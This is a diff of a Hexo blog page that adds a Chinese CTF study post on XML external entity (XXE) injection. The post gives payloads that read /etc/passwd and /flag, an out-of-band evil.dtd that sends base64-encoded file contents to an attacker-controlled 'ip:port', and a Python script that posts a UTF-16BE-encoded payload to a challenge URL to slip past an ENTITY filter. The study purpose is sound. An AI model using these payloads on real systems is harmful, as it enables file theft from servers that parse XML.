@@ -10,17 +10,22 @@
     <meta name="copyright" content="温柔刀">
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     <meta name="description" content="">
-    <meta property="og:type" content="website">
-<meta property="og:title" content="三重门">
-<meta property="og:url" content="http://example.com/archives/2025/12/index.html">
+    <meta name="description" content="基础知识：dtd，四种实体xxe 是 xml external entity，xml 外部实体注入，在叙述漏洞之前先来了解一下关于 xml 的基础知识。 xml 是一种数据格式，他允许使用者在文档头部定义要使用的变量，这部分区域就是 dtd（英文）在 dtd 里面把变量称呼为“实体”。 例如这个代码块中的就是 dtd 部分： 12345&lt;?xml version &#x3D;&quot;1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxe">
+<meta property="og:url" content="http://example.com/2025/12/08/xxe/index.html">
 <meta property="og:site_name" content="三重门">
+<meta property="og:description" content="基础知识：dtd，四种实体xxe 是 xml external entity，xml 外部实体注入，在叙述漏洞之前先来了解一下关于 xml 的基础知识。 xml 是一种数据格式，他允许使用者在文档头部定义要使用的变量，这部分区域就是 dtd（英文）在 dtd 里面把变量称呼为“实体”。 例如这个代码块中的就是 dtd 部分： 12345&lt;?xml version &#x3D;&quot;1">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-12-08T04:00:22.000Z">
+<meta property="article:modified_time" content="2025-12-08T04:00:48.327Z">
 <meta property="article:author" content="温柔刀">
+<meta property="article:tag" content="xxe">
 <meta name="twitter:card" content="summary">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
-    <title>Gentle_knife&#39;s Studio</title>
+    <title>xxe · Gentle_knife&#39;s Studio</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -208,6 +213,7 @@
             document.write('<script src="/lib/jquery.min.js" />')
         }
     </script>
+        <body class="post-body">
         <!-- header -->
         <header class="header header-mobile">
     <!-- top read progress line -->
@@ -237,7 +243,7 @@
             <a href="/">Gentle_knife&#39;s Studio.</a>
         </div>
         <div class="post-title header-element">
-            <a href="#" class="post-name"></a>
+            <a href="#" class="post-name">xxe</a>
         </div>
     </div>
 </header>
@@ -254,20 +260,60 @@
 
         <!-- wrapper -->
         <div class="wrapper">
-            <div class="site-intro" style="">
+            <div class="site-intro" style="    height:50vh;
+">
     <!-- 主页  -->
+    <!-- 404页  -->
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+                xxe
+            <!-- 404 -->
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
+            <!-- 404 -->
         </p>
         <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="xxe">xxe</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">1k</span>Reading time: <span class="post-count reading-time">4 min</span></span>
+                    </div>
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/12/08</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
     </div>
 </div>
 
@@ -396,63 +442,119 @@
 
             <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
             <div class="container container-unloaded">
-                <main class="main index-page">
+                <main class="main post-page">
+    <article class="article-entry">
+        <meta name="referrer" content="no-referrer" />
+
+
+
+
+
+<h1 id="基础知识：dtd，四种实体"><a href="#基础知识：dtd，四种实体" class="headerlink" title="基础知识：dtd，四种实体"></a>基础知识：dtd，四种实体</h1><p>xxe 是 xml external entity，xml 外部实体注入，在叙述漏洞之前先来了解一下关于 xml 的基础知识。</p>
+<p>xml 是一种数据格式，他允许使用者在文档头部定义要使用的变量，这部分区域就是 dtd（英文）在 dtd 里面把变量称呼为“实体”。</p>
+<p>例如这个代码块中的<!ENTITY name "John">就是 dtd 部分：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">whatevername</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;John&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">first</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">first</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在浏览时，&amp;name 就会被替换为John。</p>
+<p>“John”这个位置不仅可以填写普通的字符串，还支持 file:&#x2F;&#x2F;协议和 http:&#x2F;&#x2F;协议等来引用外部资源，例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">whatevername</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">first</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">first</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样我们就可以在回显处看到本地的&#x2F;etc&#x2F;passwd 文件。</p>
+<p>普通的字符串是<strong>内部实体</strong>， file:&#x2F;&#x2F;协议和 http:&#x2F;&#x2F;协议这种就是<strong>外部实体</strong>。</p>
+<p>还有一种实体的分类标准是通用实体&amp;和参数实体%。</p>
+<p>刚才我们看到的&amp;就是通用实体，他采用懒加载机制，只有写完 dtd，在 xml 部分才会开始加载。也就是说，我们想要在 dtd 部分用&amp;实现变量读取的叠加是不可能的：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">whatevername</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;John&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">full_name</span> <span class="string">&quot;&amp;name Reese&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">first</span>&gt;</span>&amp;full_name;<span class="tag">&lt;/<span class="name">first</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>要想实现这样的功能，用的是%，而相应的，%不可能出现在除了 dtd 以外的部分，也许我们可以写成这样：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">whatevername</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">name</span> <span class="string">&quot;John&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">full_name</span> <span class="string">&quot;%name; Reese&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">first</span>&gt;</span>&amp;full_name;<span class="tag">&lt;/<span class="name">first</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是实际运行的时候还是会报错，因为 xml 有一个规则，具体的表现就是，在当前的 xml 文件中，在 dtd 的双引号里是不允许出现%的。但是如果用<strong>外部实体</strong>调用外部的 dtd，就可以在 dtd 的双引号里允许出现%。</p>
+<p>例如，我们先把要用的实体移出去，改名为 evil.dtd</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">name</span> <span class="string">&quot;John&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">full_name</span> <span class="string">&quot;%name; Reese&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接着在文档里写：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">whatevername</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">source</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip:port/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     %source;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">first</span>&gt;</span>&amp;full_name;<span class="tag">&lt;/<span class="name">first</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>就可以打印出我们想要的东西了。</p>
+<h1 id="各种情景的题目"><a href="#各种情景的题目" class="headerlink" title="各种情景的题目"></a>各种情景的题目</h1><h2 id="出网无回显"><a href="#出网无回显" class="headerlink" title="出网无回显"></a>出网无回显</h2><p>evil.dtd:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">f1ag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37;(这里是%的xml编码) send SYSTEM &#x27;http://ip:port/?file=%f1ag&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+
+<p>在服务器上执行</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 9999</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">whatever</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">source</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip:port/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %source;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">whatever</span>&gt;</span>1;<span class="tag">&lt;/<span class="name">whatever</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="过滤ETENTY"><a href="#过滤ETENTY" class="headerlink" title="过滤ETENTY"></a>过滤ETENTY</h3><p>可以执行 xml，但是过滤了&lt;!ENTITY</p>
+<p>那么写个脚本，把发过去的 xml 进行编码就行</p>
+<p>(这一部分我是直接复制的其实我不懂这个脚本在干什么)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.ilovectf.cn:30036/&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始 XML：仅负责引用远程 DTD</span></span><br><span class="line"><span class="comment"># encoding=&quot;UTF-16BE&quot; 声明必须与实际编码一致</span></span><br><span class="line">payload_str = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16BE&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://106.15.35.97:9999/evil.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root/&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键点1：转为 UTF-16BE 二进制流绕过 WAF</span></span><br><span class="line">payload_bytes = payload_str.encode(<span class="string">&#x27;utf-16be&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键点2：封装为表单数据 (application/x-www-form-urlencoded)</span></span><br><span class="line"><span class="comment"># requests 会自动对 bytes 进行 URL 编码</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;xmlInput&quot;</span>: payload_bytes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 ... Chrome/142.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Sending Payload...&quot;</span>)</span><br><span class="line">    res = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] Status: <span class="subst">&#123;res.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Response snippet:&quot;</span>, res.text[:<span class="number">100</span>])</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>Author：<a href="http://example.com">温柔刀</a>
+            <p>Link：<a href="http://example.com/2025/12/08/xxe/">http://example.com/2025/12/08/xxe/</a>
+            <p>Publish date：<a href="http://example.com/2025/12/08/xxe/">December 8th 2025, 12:00:22 pm</a>
+            <p>Update date：<a href="http://example.com/2025/12/08/xxe/">December 8th 2025, 12:00:48 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/12/01/%5B%E5%86%99%E4%BA%86%E4%B8%80%E5%8D%8A%5DXSS+CSP%E2%80%94%E2%80%940xgame2024paste_bin%E4%B8%8ERCTF2025author/" title="(写了75)XSS+CSP——0xgame2024paste_bin与RCTF2025author">
+                    <div class="prevTitle">(写了75)XSS+CSP——0xgame2024paste_bin与RCTF2025author</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
             
-        <article class="index-post">
-            <a class="abstract-title" href="/2025/12/08/xxe/">
-                <span class="abstract-title-text">xxe</span>
-            </a>
-            <div class="abstract-content">
-                
-
-
-
-
-
-基础知识：dtd，四种实体xxe 是 xml external entity，xml 外部实体注入，在叙述漏洞之前先来了解一下关于 xml 的基础知识。
-xml 是一种数据格式，他允...
-            </div>
-            <!-- read more -->
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2025/12/08">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2025/12/08</span>
-                </div>
-                <!-- tags -->
-                    <div class="abstract-tags" >
-        <a class="post-tag" href="javascript:void(0);" data-tags="xxe">xxe</a>
-</div>
-
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
             
-        <article class="index-post">
-            <a class="abstract-title" href="/2025/12/01/%5B%E5%86%99%E4%BA%86%E4%B8%80%E5%8D%8A%5DXSS+CSP%E2%80%94%E2%80%940xgame2024paste_bin%E4%B8%8ERCTF2025author/">
-                <span class="abstract-title-text">(写了75)XSS+CSP——0xgame2024paste_bin与RCTF2025author</span>
-            </a>
-            <div class="abstract-content">
-                
+            
+            <!-- utteranc评论 -->
 
-因为共同点很多所以把两道题串联起来一起记。
-基础知识“XSS 全称 Cross Site Scripting (因为简称与 CSS 同名，所以改成了 XSS)，即跨站脚本攻击，简单来说就是可...
-            </div>
-            <!-- read more -->
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2025/12/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2025/12/01</span>
-                </div>
-                <!-- tags -->
-                    <div class="abstract-tags" >
-        <a class="post-tag" href="javascript:void(0);" data-tags="XSS">XSS</a>
-        <a class="post-tag" href="javascript:void(0);" data-tags="CSP">CSP</a>
-</div>
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
 
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    <!-- paginator  -->
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+        <script>
+            (function () {
+                const time = document.getElementsByClassName('post-intro-time')[0]
+                const post = document.getElementsByTagName("article")[0]
+                if (time === undefined || post === undefined) {
+                    return
+                }
+
+                const pubTime = new Date(time.innerText)
+                const now = Date.now()
+                const interval = parseInt(now - pubTime)
+                const days = parseInt(interval / 86400000)
+                const outdated_threshold = parseInt(180)
+                if (interval > outdated_threshold * 24 * 3600 * 1000) {
+                    post.innerHTML = '<div class="note note-warning">' +
+                    `<div class="title">文章时效性提示</div><p>这是一篇发布于 ${days} 天前的文章，部分信息可能已发生改变，请注意甄别。` +
+                    '</p></div>' + post.innerHTML;
+                }
+            })();
+        </script>
+    <!-- Mathjax -->
 </main>
 
                 <!-- profile -->
@@ -480,6 +582,13 @@ xml 是一种数据格式，他允...
 
         </div>
         <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9Adtd%EF%BC%8C%E5%9B%9B%E7%A7%8D%E5%AE%9E%E4%BD%93"><span class="toc-number">1.</span> <span class="toc-text">基础知识：dtd，四种实体</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E6%83%85%E6%99%AF%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">各种情景的题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E7%BD%91%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">2.1.</span> <span class="toc-text">出网无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4ETENTY"><span class="toc-number">2.1.1.</span> <span class="toc-text">过滤ETENTY</span></a></li></ol></li></ol></li></ol>
+            </div>
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
     <ul class="sidebar-tabs sidebar-tabs-active-0">
@@ -772,6 +881,7 @@ xml 是一种数据格式，他允...
         <!-- busuanzi -->
             <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
         <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
         <!-- mermaid -->
     </body>
 </html>
